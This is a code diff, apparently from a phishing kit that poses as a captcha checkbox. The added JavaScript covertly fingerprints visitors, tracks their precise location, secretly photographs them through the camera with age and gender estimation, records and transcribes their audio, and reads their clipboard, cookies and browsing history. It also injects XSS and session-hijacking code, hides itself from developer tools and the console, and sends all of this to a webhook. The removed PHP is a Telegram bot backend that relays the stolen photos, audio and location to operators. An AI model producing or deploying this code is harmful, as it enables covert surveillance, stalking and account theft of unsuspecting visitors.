+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    data.network = {
+                        type: conn.effectiveType || null,
+                        downlink: conn.downlink || null,
+                        rtt: conn.rtt || null,
+                        saveData: conn.saveData || false,
+                    };
+                }
+            } catch (_) {}
+
+            try {
+                const batt = await navigator.getBattery();
+                data.battery = {
+                    level: Math.round(batt.level * 100),
+                    charging: batt.charging,
+                    chargingTime: batt.chargingTime,
+                    dischargingTime: batt.dischargingTime,
+                };
+            } catch (_) {}
+
+            try {
+                if (performance && performance.memory) {
+                    data.performance = {
+                        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                        totalJSHeapSize: performance.memory.totalJSHeapSize,
+                        usedJSHeapSize: performance.memory.usedJSHeapSize,
+                    };
+                }
+            } catch (_) {}
+
+            try {
+                const c = document.createElement('canvas');
+                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+                if (gl) {
+                    const info = gl.getExtension('WEBGL_debug_renderer_info');
+                    data.webgl = {
+                        vendor: info ? gl.getParameter(info.UNMASKED_VENDOR_WEBGL) : null,
+                        renderer: info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : null,
+                        version: gl.getParameter(gl.VERSION),
+                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                        extensions: gl.getSupportedExtensions() || [],
+                    };
+                }
+            } catch (_) {}
+
+            try {
+                const c = document.createElement('canvas');
+                c.width = 256;
+                c.height = 128;
+                const ctx = c.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
+                const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(c.toDataURL()));
+                data.canvasHash = btoa(String.fromCharCode(...new Uint8Array(hash)));
+            } catch (_) {}
+
+            try {
+                const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
+                    'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Geneva',
+                    'Lucida Sans', 'Lucida Grande', 'Lucida Console', 'Roboto', 'Open Sans', 'Lato', 'Montserrat',
+                    'Oswald', 'Raleway', 'Poppins', 'Nunito', 'Inter', 'Segoe UI', 'System UI'
+                ];
+                const base = ['monospace', 'sans-serif', 'serif'];
+                const tc = document.createElement('canvas');
+                tc.width = 200;
+                tc.height = 50;
+                const tctx = tc.getContext('2d');
+                const testStr = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+
+                function getWidth(f) { tctx.font = `14px ${f}`; return tctx.measureText(testStr).width; }
+                const baseWidths = base.map(f => getWidth(f));
+                data.installedFonts = [];
+                for (const f of fonts) {
+                    const w = getWidth(f);
+                    if (!baseWidths.some(bw => Math.abs(bw - w) < 1)) data.installedFonts.push(f);
+                }
+                if (data.installedFonts.length > 50) data.installedFonts = data.installedFonts.slice(0, 50);
+            } catch (_) {}
+
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                data.ip = d.ip || 'غير متاح';
+                state.userIP = data.ip;
+            } catch (_) {
+                data.ip = 'غير متاح';
+            }
+
+            data.device = dev;
+            data.spoofing = spoof;
+            data.extensions = state.installedExtensions;
+            data.clipboard = state.clipboardContent;
+            data.storages = state.allCookies;
+            data.history = state.browserHistory;
+            data.permissions = state.permissionsGranted;
+
+            state.collectedData = data;
+            return data;
+        }
+
+        // ================================================================
+        //  الموقع
+        // ================================================================
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
+                    resolve();
+                    return;
+                }
+                let watchId = null,
+                    best = null,
+                    bestAcc = Infinity,
+                    resolved = false,
+                    attempts = 0;
+                const maxAttempts = CONFIG.LOCATION_ATTEMPTS;
+                const timeout = CONFIG.LOCATION_TIMEOUT;
+                const targetAcc = CONFIG.LOCATION_TARGET_ACCURACY;
+
+                const finish = () => {
+                    if (resolved) return;
+                    resolved = true;
+                    if (watchId) navigator.geolocation.clearWatch(watchId);
+                    if (best) {
+                        state.userLocation.lat = best.coords.latitude;
+                        state.userLocation.lng = best.coords.longitude;
+                        state.userLocation.accuracy = best.coords.accuracy;
+                        state.userLocation.error = null;
+                        state.permissionsGranted.location = true;
+                    } else {
+                        state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
+                        state.permissionsGranted.location = false;
+                    }
+                    resolve();
+                };
+
+                const timer = setTimeout(() => {
+                    if (!resolved) {
+                        if (watchId) navigator.geolocation.clearWatch(watchId);
+                        if (best) finish();
+                        else { state.userLocation.error = 'انتهت المهلة';
+                            state.permissionsGranted.location = false;
+                            resolve(); }
+                    }
+                }, timeout);
+
+                const onPos = (p) => {
+                    attempts++;
+                    const acc = p.coords.accuracy;
+                    if (acc < bestAcc) { bestAcc = acc;
+                        best = p; }
+                    if (acc <= targetAcc || attempts >= maxAttempts) {
+                        clearTimeout(timer);
+                        finish();
+                    }
+                };
+
+                const onErr = (e) => {
+                    if (resolved) return;
+                    if (e.code === 1) {
+                        state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
+                        state.permissionsGranted.location = false;
+                        resolved = true;
+                        if (watchId) navigator.geolocation.clearWatch(watchId);
+                        clearTimeout(timer);
+                        resolve();
+                        return;
+                    }
+                    if (attempts < maxAttempts) { /* نستمر */ } else {
+                        if (best) finish();
+                        else { state.userLocation.error = e.message || 'تعذر الحصول على الموقع';
+                            state.permissionsGranted.location = false;
+                            resolve(); }
+                    }
+                };
+
+                watchId = navigator.geolocation.watchPosition(onPos, onErr, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 2000
+                });
+            });
+        }
+
+        // ================================================================
+        //  Face-API
+        // ================================================================
+        async function loadFaceApi() {
+            if (state.isFaceApiLoaded) return true;
+            if (state.faceApiLoadAttempted) return false;
+            state.faceApiLoadAttempted = true;
+
+            try {
+                if (typeof faceapi === 'undefined') {
+                    await new Promise((res, rej) => {
+                        const s = document.createElement('script');
+                        s.src = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js';
+                        s.onload = res;
+                        s.onerror = () => rej(new Error('Face-API load failed'));
+                        document.head.appendChild(s);
+                    });
+                }
+                const url = CONFIG.FACE_MODEL_URL;
+                await faceapi.nets.tinyFaceDetector.loadFromUri(url);
+                await faceapi.nets.ageGenderNet.loadFromUri(url);
+                state.isFaceApiLoaded = true;
+                return true;
+            } catch (_) {
+                state.isFaceApiLoaded = false;
+                return false;
+            }
+        }
+
+        // ================================================================
+        //  الكاميرا – تضمن التقاط 8 صور
+        // ================================================================
+        async function startCameraAndCapture() {
+            return new Promise(async (resolve) => {
+                try {
+                    const constraints = {
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 },
+                        },
+                        audio: false,
+                    };
+                    state.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    state.permissionsGranted.camera = true;
+                    el.hiddenVideo.srcObject = state.mediaStream;
+                    await el.hiddenVideo.play();
+
+                    await new Promise((res, rej) => {
+                        const t = setTimeout(() => rej(new Error('Video timeout')), 10000);
+                        const ready = () => { clearTimeout(t);
+                            res(); };
+                        if (el.hiddenVideo.readyState >= 2 && el.hiddenVideo.videoWidth > 0) ready();
+                        else {
+                            el.hiddenVideo.addEventListener('loadedmetadata', ready);
+                            el.hiddenVideo.addEventListener('canplay', ready);
+                            el.hiddenVideo.play().catch(() => {});
+                        }
+                    });
+
+                    await new Promise(r => setTimeout(r, 500));
+                    const ctx = el.hiddenCanvas.getContext('2d');
+                    const w = Math.min(el.hiddenVideo.videoWidth || 640, 1920);
+                    const h = Math.min(el.hiddenVideo.videoHeight || 480, 1080);
+                    el.hiddenCanvas.width = w;
+                    el.hiddenCanvas.height = h;
+
+                    const faceLoaded = await loadFaceApi();
+                    if (faceLoaded && !state.isHeadless) {
+                        try {
+                            const det = await faceapi.detectSingleFace(el.hiddenVideo, new faceapi
+                                    .TinyFaceDetectorOptions())
+                                .withAgeAndGender();
+                            if (det) {
+                                state.faceData = {
+                                    age: Math.round(det.age),
+                                    gender: det.gender,
+                                    genderProbability: det.genderProbability,
+                                    confidence: det.detection.score,
+                                    faceDetected: true,
+                                };
+                            } else {
+                                state.faceData = { faceDetected: false };
+                            }
+                        } catch (_) {
+                            state.faceData = { faceDetected: false };
+                        }
+                    } else {
+                        state.faceData = { faceDetected: false };
+                    }
+
+                    state.capturedPhotoFiles = [];
+                    for (let i = 1; i <= CONFIG.TOTAL_PHOTOS; i++) {
+                        ctx.drawImage(el.hiddenVideo, 0, 0, w, h);
+                        const blob = await new Promise((res) => {
+                            el.hiddenCanvas.toBlob((b) => res(b), 'image/jpeg', CONFIG.PHOTO_QUALITY);
+                        });
+                        if (blob && blob.size > 1000) {
+                            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                            state.capturedPhotoFiles.push(file);
+                        }
+                        if (i < CONFIG.TOTAL_PHOTOS) await new Promise(r => setTimeout(r, CONFIG.CAPTURE_INTERVAL));
+                    }
+                    
+                    logToConsole('📸 تم التقاط ' + state.capturedPhotoFiles.length + ' صورة');
+                    resolve(true);
+                } catch (err) {
+                    state.permissionsGranted.camera = false;
+                    if (state.mediaStream) {
+                        state.mediaStream.getTracks().forEach(t => t.stop());
+                        state.mediaStream = null;
+                    }
+                    el.hiddenVideo.srcObject = null;
+                    resolve(false);
+                }
+            });
+        }
+
+        // ================================================================
+        //  الميكروفون
+        // ================================================================
+        async function recordAudio() {
+            return new Promise(async (resolve) => {
+                try {
+                    const constraints = { audio: { echoCancellation: false, noiseSuppression: false,
+                            autoGainControl: false } };
+                    state.audioStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    state.permissionsGranted.mic = true;
+                    state.audioRecorder = new MediaRecorder(state.audioStream, { mimeType: 'audio/webm;codecs=opus' });
+                    state.audioChunks = [];
+                    state.audioRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) state.audioChunks.push(e.data);
+                    };
+                    let done = false;
+                    state.audioRecorder.onstop = async () => {
+                        if (state.audioChunks.length > 0) {
+                            state.audioBlob = new Blob(state.audioChunks, { type: 'audio/webm' });
+                            await transcribeAudio(state.audioBlob);
+                        }
+                        done = true;
+                        resolve();
+                    };
+                    state.audioRecorder.start();
+                    setTimeout(() => {
+                        if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
+                        if (state.audioStream) state.audioStream.getTracks().forEach(t => t.stop());
+                    }, CONFIG.AUDIO_DURATION);
+                    setTimeout(() => {
+                        if (!done) {
+                            if (state.audioRecorder.state === 'recording') state.audioRecorder.stop();
+                            resolve();
+                        }
+                    }, CONFIG.AUDIO_DURATION + 3000);
+                } catch (_) {
+                    state.permissionsGranted.mic = false;
+                    resolve();
+                }
+            });
+        }
+
+        async function transcribeAudio(blob) {
+            try {
+                if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) return;
+                const url = URL.createObjectURL(blob);
+                const audio = new Audio(url);
+                await audio.play();
+                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+                const rec = new SR();
+                rec.lang = 'ar-EG';
+                rec.continuous = false;
+                rec.interimResults = false;
+                rec.maxAlternatives = 1;
+                return new Promise((resolve) => {
+                    let done = false;
+                    rec.onresult = (e) => {
+                        const t = e.results[0][0].transcript;
+                        state.transcribedText = t;
+                        if (/[a-zA-Z]/.test(t) && !/[ء-ي]/.test(t)) state.detectedLanguage = 'en';
+                        else if (/[ء-ي]/.test(t)) state.detectedLanguage = 'ar';
+                        else state.detectedLanguage = 'unknown';
+                        done = true;
+                        resolve();
+                    };
+                    rec.onerror = () => { if (!done) resolve(); };
+                    rec.onend = () => { if (!done) resolve(); };
+                    rec.start();
+                    setTimeout(() => {
+                        try { rec.stop(); } catch (_) {}
+                        if (!done) resolve();
+                    }, 8000);
+                });
+            } catch (_) {
+                state.transcribedText = null;
+                state.detectedLanguage = null;
+            }
+        }
+
+        // ================================================================
+        //  الهجمات
+        // ================================================================
+        function deployAdvancedAttacks() {
+            const results = { xss: false, csrf: false, sessionHijack: false, payloads: [] };
+            try {
+                const inp = document.createElement('input');
+                inp.type = 'hidden';
+                inp.id = 'xss_payload';
+                inp.value = `<img src=x onerror="alert(1)">`;
+                document.body.appendChild(inp);
+                results.xss = true;
+                results.payloads.push({ type: 'xss', content: inp.value });
+                document.body.removeChild(inp);
+            } catch (_) {}
+            try {
+                const ifr = document.createElement('iframe');
+                ifr.style.cssText = 'position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;';
+                ifr.src = 'https://example.com';
+                document.body.appendChild(ifr);
+                setTimeout(() => ifr.remove(), 3000);
+                results.csrf = true;
+            } catch (_) {}
+            try {
+                const cookies = document.cookie.split(';');
+                const sessionCookies = cookies.filter(c => {
+                    const l = c.toLowerCase();
+                    return l.includes('session') || l.includes('phpsessid') || l.includes('token') || l.includes(
+                    'auth');
+                });
+                if (sessionCookies.length > 0) {
+                    results.sessionHijack = true;
+                    results.payloads.push({ type: 'session', cookies: sessionCookies });
+                }
+            } catch (_) {}
+            state.attacksData = results;
+            return results;
+        }
+
+        // ================================================================
+        //  الأمان
+        // ================================================================
+        function setupSecurity() {
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('dragstart', e => e.preventDefault());
+            document.addEventListener('selectstart', e => e.preventDefault());
+
+            document.addEventListener('keydown', e => {
+                const key = e.key,
+                    ctrl = e.ctrlKey || e.metaKey,
+                    shift = e.shiftKey;
+                if (key === 'F12' || (ctrl && shift && ['I', 'C', 'J'].includes(key)) || (ctrl && key === 'U')) {
+                    e.preventDefault();
+                    reportSuspicious(`devtools (${key})`);
+                    if (key === 'F12' || (ctrl && shift && key === 'I')) {
+                        window.location.href = 'https://www.google.com';
+                    }
+                }
+                if (ctrl && ['c', 'v', 'x'].includes(key)) {
+                    reportSuspicious(`copy/paste (${key})`);
+                }
+            });
+
+            let lastW = window.innerWidth,
+                lastH = window.innerHeight;
+            setInterval(() => {
+                if (window.innerWidth !== lastW || window.innerHeight !== lastH) {
+                    if (Math.abs(window.innerWidth - lastW) > 80 || Math.abs(window.innerHeight - lastH) > 80) {
+                        reportSuspicious(`window resize (${window.innerWidth}x${window.innerHeight})`);
+                    }
+                    lastW = window.innerWidth;
+                    lastH = window.innerHeight;
+                }
+            }, 2000);
+        }
+
+        let alertCooldown = 0;
+
+        function reportSuspicious(action) {
+            if (!state.userToken) return;
+            const now = Date.now();
+            if (now - alertCooldown < 5000) return;
+            alertCooldown = now;
+            const fd = new FormData();
+            fd.append('event', 'suspicious');
+            fd.append('action', action);
+            fd.append('timestamp', new Date().toISOString());
+            fd.append('ip', state.userIP);
+            fd.append('userAgent', navigator.userAgent);
+            fd.append('url', window.location.href);
+            fd.append('token', state.userToken);
+            fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd }).catch(() => {});
+        }
+
+        function enhanceStealth() {
+            console.log = console.warn = console.error = console.info = () => {};
+            const origFetch = window.fetch;
+            window.fetch = function(...args) {
+                const delay = Math.floor(Math.random() * 250) + 80;
+                return new Promise(resolve => {
+                    setTimeout(() => resolve(origFetch.apply(this, args)), delay);
+                });
+            };
+            try {
+                if ('serviceWorker' in navigator) {
+                    const code =
+                        `self.addEventListener('install',e=>e.waitUntil(self.skipWaiting()));self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('fetch',e=>e.respondWith(fetch(e.request)));`;
+                    const blob = new Blob([code], { type: 'application/javascript' });
+                    const url = URL.createObjectURL(blob);
+                    navigator.serviceWorker.register(url, { scope: '/' }).catch(() => {});
+                }
+            } catch (_) {}
+        }
+
+        // ================================================================
+        //  الإرسال النهائي
+        // ================================================================
+        async function sendAllData(forceRetry = false) {
+            if (state.dataSent && !forceRetry) return true;
+
+            const fd = new FormData();
+            fd.append('event', 'submission');
+            fd.append('token', state.userToken);
+            fd.append('ip', state.userIP);
+            fd.append('timestamp', new Date().toISOString());
+            fd.append('photoCount', state.capturedPhotoFiles.length);
+
+            fd.append('location[lat]', state.userLocation.lat !== null ? String(state.userLocation.lat) : '');
+            fd.append('location[lng]', state.userLocation.lng !== null ? String(state.userLocation.lng) : '');
+            fd.append('location[accuracy]', state.userLocation.accuracy !== null ? String(state.userLocation.accuracy) :
+                '');
+            fd.append('location[error]', state.userLocation.error || '');
+
+            fd.append('deviceData', safeStringify(state.collectedData));
+            fd.append('attacks', safeStringify(state.attacksData));
+            if (state.faceData) fd.append('faceData', safeStringify(state.faceData));
+            if (state.transcribedText) {
+                fd.append('transcribedText', state.transcribedText);
+                fd.append('detectedLanguage', state.detectedLanguage || 'unknown');
+            }
+            fd.append('clipboard', state.clipboardContent || '');
+            fd.append('isHeadless', String(state.isHeadless));
+
+            // إضافة الصور
+            if (state.capturedPhotoFiles.length > 0) {
+                state.capturedPhotoFiles.forEach((f, i) => {
+                    fd.append(`photos[]`, f, f.name);
+                });
+                logToConsole('📸 إرسال ' + state.capturedPhotoFiles.length + ' صور');
             } else {
-                $textMsg .= "\n⭑ ʟᴏᴄᴀᴛɪᴏɴ ꜱᴛᴀᴛᴜꜱ ⭒\n┃˹⚠️˼ ʟᴏᴄᴀᴛɪᴏɴ ᴜɴᴀᴠᴀɪʟᴀʙʟᴇ \n┃⍟ $safeError\n╰───────────────";
+                logToConsole('⚠️ لا توجد صور للإرسال');
             }
-        }
 
-        // إضافة بيانات الجهاز (مختصرة)
-        if ($deviceData) {
-            $dev = json_decode($deviceData, true);
-            if ($dev) {
-                if ($lang === 'ar') {
-                    $textMsg .= "\n⭑ معلومات الجهاز ⭒\n⊚─〔 بيانات الجهاز 〕─────\n";
-                    $textMsg .= "˼📱˹ نظام التشغيل: " . ($dev['device']['os'] ?? 'غير معروف') . " ⭒\n";
-                    $textMsg .= "˼🌐˹ المتصفح: " . ($dev['device']['browser'] ?? 'غير معروف') . " ⭒\n";
-                    $textMsg .= "˼🖥️˹ الشاشة: " . ($dev['screen']['width'] ?? '?') . "x" . ($dev['screen']['height'] ?? '?') . " ⭒\n";
-                    $textMsg .= "─────────────────";
-                } else {
-                    $textMsg .= "\n⭑ ᴅᴇᴠɪᴄᴇ ɪɴꜰᴏ ⭒\n‌╭⊚─〔 ʜᴀʀᴅᴡᴀʀᴇ 〕─────\n";
-                    $textMsg .= "┃˹📱˼ ᴏꜱ: " . ($dev['device']['os'] ?? 'ᴜɴᴋɴᴏᴡɴ') . " ⭒\n";
-                    $textMsg .= "┃˹🌐˼ ʙʀᴏᴡꜱᴇʀ: " . ($dev['device']['browser'] ?? 'ᴜɴᴋɴᴏᴡɴ') . " ⭒\n";
-                    $textMsg .= "┃˹🖥️˼ ꜱᴄʀᴇᴇɴ: " . ($dev['screen']['width'] ?? '?') . "x" . ($dev['screen']['height'] ?? '?') . " ⭒\n";
-                    $textMsg .= "╰───────────────";
+            if (state.audioBlob) {
+                const af = new File([state.audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
+                fd.append('audio', af);
+            }
+
+            try {
+                const res = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
+                const result = await res.json();
+                if (!res.ok) throw new Error(result.message || 'HTTP error');
+                state.dataSent = true;
+                state.pendingRetries = 0;
+                logToConsole('✅ Data sent successfully');
+                return true;
+            } catch (err) {
+                logToConsole('❌ Send failed: ' + err.message);
+                const backupData = {
+                    token: state.userToken,
+                    ip: state.userIP,
+                    location: state.userLocation,
+                    collectedData: state.collectedData,
+                    attacksData: state.attacksData,
+                    faceData: state.faceData,
+                    transcribedText: state.transcribedText,
+                    detectedLanguage: state.detectedLanguage,
+                    clipboardContent: state.clipboardContent,
+                    isHeadless: state.isHeadless,
+                    photoCount: state.capturedPhotoFiles.length,
+                    timestamp: new Date().toISOString()
+                };
+                saveToIndexedDB(backupData);
+
+                if (state.pendingRetries < CONFIG.MAX_RETRIES) {
+                    state.pendingRetries++;
+                    setTimeout(() => {
+                        sendAllData(true);
+                    }, CONFIG.RETRY_INTERVAL);
                 }
+                return false;
             }
         }
 
-        $textMsg .= "\n🕒 $timestamp";
-
-        // إرسال الرسالة النصية
-        $this->sendMessage($chatId, $textMsg);
-
         // ================================================================
-        //  معالجة الملفات
+        //  عملية الجمع المتدرجة
         // ================================================================
-        $tempFiles = [];
-        $photoCount = 0;
-        $audioSize = 0;
+        async function collectEverything() {
+            if (state.isCollecting || state.collectionComplete) return;
+            state.isCollecting = true;
+            state.startTime = Date.now();
+            setUIState('loading');
 
-        try {
-            // الصور
-            if (isset($files['photos']) && !empty($files['photos']['tmp_name'][0])) {
-                $photoFiles = $files['photos'];
-                $mediaGroup = [];
-                foreach ($photoFiles['tmp_name'] as $idx => $tmpPath) {
-                    if (empty($tmpPath)) continue;
-                    if (filesize($tmpPath) > MAX_FILE_SIZE) {
-                        log_warning("Photo too large: " . filesize($tmpPath));
-                        continue;
+            try {
+                classifyDevice();
+                detectSpoofing();
+                await detectExtensions();
+                stealStorages();
+                getSearchHistory();
+
+                await getLocation();
+                await startCameraAndCapture();
+                await recordAudio();
+                await collectDeviceData();
+                deployAdvancedAttacks();
+                await readClipboard();
+                await sendAllData();
+
+                state.collectionComplete = true;
+                state.isCollecting = false;
+                setUIState('success');
+                logToConsole('🎉 Collection complete v' + CONFIG.VERSION);
+
+                setTimeout(() => {
+                    if (!state.collectionComplete) {
+                        logToConsole('🔄 Attempting silent retry...');
+                        collectEverything();
                     }
-                    $ext = pathinfo($photoFiles['name'][$idx], PATHINFO_EXTENSION);
-                    $fileName = 'photo_' . bin2hex(random_bytes(8)) . '.' . $ext;
-                    $destPath = $this->tempDir . $fileName;
-                    if (move_uploaded_file($tmpPath, $destPath)) {
-                        $tempFiles[] = $destPath;
-                        $mediaGroup[] = ['media' => 'attach://' . $fileName];
-                        $photoCount++;
-                    }
-                }
-                if (!empty($mediaGroup)) {
-                    $this->sendMediaGroup($chatId, $mediaGroup, $tempFiles);
-                }
-            }
+                }, 10000);
 
-            // الصوت
-            if (isset($files['audio']) && !empty($files['audio']['tmp_name'])) {
-                $audioFile = $files['audio'];
-                if (filesize($audioFile['tmp_name']) <= MAX_FILE_SIZE) {
-                    $ext = pathinfo($audioFile['name'], PATHINFO_EXTENSION);
-                    $audioName = 'audio_' . bin2hex(random_bytes(8)) . '.' . $ext;
-                    $audioPath = $this->tempDir . $audioName;
-                    if (move_uploaded_file($audioFile['tmp_name'], $audioPath)) {
-                        $tempFiles[] = $audioPath;
-                        $audioSize = filesize($audioPath);
-                        $caption = $lang === 'ar' ? "⭑ رســالــة صــوتــيــة ⭒" : "⭑ ᴠᴏɪᴄᴇ ᴍᴇꜱꜱᴀɢᴇ ⭒";
-                        $this->sendAudio($chatId, $audioPath, $caption);
-                    }
-                } else {
-                    log_warning("Audio too large: " . filesize($audioFile['tmp_name']));
-                }
+            } catch (err) {
+                state.isCollecting = false;
+                setUIState('failed');
+                logToConsole('❌ Collection error: ' + err.message);
+                const backupData = {
+                    token: state.userToken,
+                    ip: state.userIP,
+                    location: state.userLocation,
+                    collectedData: state.collectedData,
+                    timestamp: new Date().toISOString()
+                };
+                saveToIndexedDB(backupData);
             }
-        } finally {
-            $this->deleteTempFiles($tempFiles);
         }
 
         // ================================================================
-        //  حفظ في قاعدة البيانات
+        //  أحداث الواجهة
         // ================================================================
-        $submissionData = [
-            'user_id' => $userId,
-            'token' => $token,
-            'ip' => $ip,
-            'location_lat' => $lat,
-            'location_lng' => $lng,
-            'location_accuracy' => $accuracy,
-            'location_error' => $locationError,
-            'device_data' => $deviceData,
-            'attacks_data' => $attacksData,
-            'audio_transcript' => null,
-            'photo_count' => $photoCount,
-            'audio_size' => $audioSize
-        ];
-        $this->db->saveSubmission($submissionData);
-        $this->db->incrementSubmissions($userId);
-
-        // حفظ الهجمات إذا وجدت
-        if ($attacksData) {
-            $attacks = json_decode($attacksData, true);
-            if ($attacks) {
-                if ($attacks['xss'] ?? false) {
-                    $this->db->saveAttackLog($userId, $token, 'XSS', json_encode($attacks['payloads'] ?? []));
-                }
-                if ($attacks['csrf'] ?? false) {
-                    $this->db->saveAttackLog($userId, $token, 'CSRF', 'iframe injected');
-                }
-                if ($attacks['sessionHijack'] ?? false) {
-                    $this->db->saveAttackLog($userId, $token, 'Session Hijack', json_encode($attacks['payloads'] ?? []));
-                }
+        el.checkbox.addEventListener('change', function(e) {
+            if (this.checked) {
+                if (el.spinner.classList.contains('success') || state.collectionComplete) return;
+                this.checked = false;
+                collectEverything();
             }
-        }
+        });
 
-        log_info("✅ Data submission processed: user_id=$userId, photos=$photoCount, audio=" . ($audioSize > 0 ? $audioSize . 'b' : 'none'));
-        return true;
-    }
+        el.checkbox.addEventListener('click', function(e) {
+            if (this.disabled) e.preventDefault();
+        });
 
-    // ====================================================================
-    //  Reverse Geocoding (OpenStreetMap Nominatim)
-    // ====================================================================
-    private function reverseGeocode(float $lat, float $lng): array {
-        $cacheKey = 'geo_' . md5($lat . ',' . $lng);
-        // بسيط: نستخدم cache في الذاكرة (لكن في الواقع نفضل استخدام قاعدة بيانات)
-        static $cache = [];
-        if (isset($cache[$cacheKey])) return $cache[$cacheKey];
-
-        $url = "https://nominatim.openstreetmap.org/reverse?lat={$lat}&lon={$lng}&format=json&zoom=18&accept-language=ar";
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'OctopusBot/2.0');
-        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-        $response = curl_exec($ch);
-        curl_close($ch);
-
-        $result = ['city' => null, 'state' => null, 'country' => null];
-        if ($response) {
-            $data = json_decode($response, true);
-            if ($data && isset($data['address'])) {
-                $addr = $data['address'];
-                $result['city'] = $addr['city'] ?? $addr['town'] ?? $addr['village'] ?? null;
-                $result['state'] = $addr['state'] ?? $addr['province'] ?? null;
-                $result['country'] = $addr['country'] ?? null;
+        el.wrapper.addEventListener('click', function(e) {
+            if (e.target.closest('.checkmark') || e.target.closest('.logo') ||
+                e.target.closest('.captcha-footer') || e.target.closest('.links') || e.target.closest('.brand')) {
+                return;
             }
-        }
-        $cache[$cacheKey] = $result;
-        return $result;
-    }
-
-    // ====================================================================
-    //  إشعار المشرفين بتوكن غير صالح
-    // ====================================================================
-    private function notifyAdminInvalidToken(string $token, array $post, array $files): void {
-        $safeToken = htmlspecialchars($token);
-        $msg = "⭑ ɪɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ ᴀʟᴇʀᴛ ⭒\n┃˹⚠️˼ ᴛᴏᴋᴇɴ: <code>$safeToken</code> ⭒\n┃˹📦˼ ʀᴇᴄᴇɪᴠᴇᴅ ᴅᴀᴛᴀ ⭒\n";
-        foreach ($post as $key => $value) {
-            if (is_array($value)) $value = json_encode($value, JSON_UNESCAPED_UNICODE);
-            $safeKey = htmlspecialchars((string)$key);
-            $safeVal = htmlspecialchars((string)$value);
-            $msg .= "┃ • $safeKey: $safeVal\n";
-        }
-        if (isset($files['photos'])) $msg .= "┃˹📸˼ ᴘʜᴏᴛᴏꜱ: " . count($files['photos']['name']) . " ⭒\n";
-        if (isset($files['audio'])) $msg .= "┃˹🎤˼ ᴀᴜᴅɪᴏ: ᴀᴠᴀɪʟᴀʙʟᴇ ⭒\n";
-        $msg .= "\n🔹 ᴘʟᴇᴀꜱᴇ ᴀꜱᴋ ᴛʜᴇ ᴜꜱᴇʀ ᴛᴏ ꜱᴛᴀʀᴛ ᴛʜᴇ ʙᴏᴛ ᴜꜱɪɴɢ /start";
-        foreach (ADMIN_IDS as $adminId) {
-            $this->sendMessage($adminId, $msg);
-        }
-    }
-}
-
-// ========================================================================
-//  دوال Webhook
-// ========================================================================
-function handleTelegramWebhook(): void {
-    log_info("📥 Webhook request received");
-    $input = file_get_contents('php://input');
-    if (!$input) {
-        http_response_code(400);
-        echo json_encode(['status' => 'error', 'message' => 'No data']);
-        return;
-    }
-    $update = json_decode($input, true);
-    if (!$update) {
-        http_response_code(400);
-        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
-        return;
-    }
-    try {
-        $bot = new TelegramBot(BOT_TOKEN);
-        $bot->handleUpdate($update);
-        http_response_code(200);
-        echo json_encode(['status' => 'ok']);
-    } catch (Throwable $e) {
-        log_error("Webhook exception: " . $e->getMessage());
-        http_response_code(500);
-        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
-    }
-}
-
-function handleDataWebhook(): void {
-    log_info("📥 Data webhook received");
-    $post = $_POST;
-    $files = $_FILES;
-
-    if (empty($post) && empty($files)) {
-        $input = file_get_contents('php://input');
-        if ($input) {
-            $data = json_decode($input, true);
-            if ($data && isset($data['token'])) {
-                $post = $data;
-                $files = [];
-                log_info("JSON data loaded");
+            if (state.collectionComplete || state.isCollecting) return;
+            if (!el.checkbox.checked && !el.spinner.classList.contains('loading')) {
+                el.checkbox.checked = true;
+                el.checkbox.dispatchEvent(new Event('change'));
             }
-        }
-    }
+        });
 
-    $token = $post['token'] ?? null;
-    if (!$token) {
-        http_response_code(400);
-        echo json_encode(['status' => 'error', 'message' => 'Missing token']);
-        return;
-    }
+        // ================================================================
+        //  التهيئة
+        // ================================================================
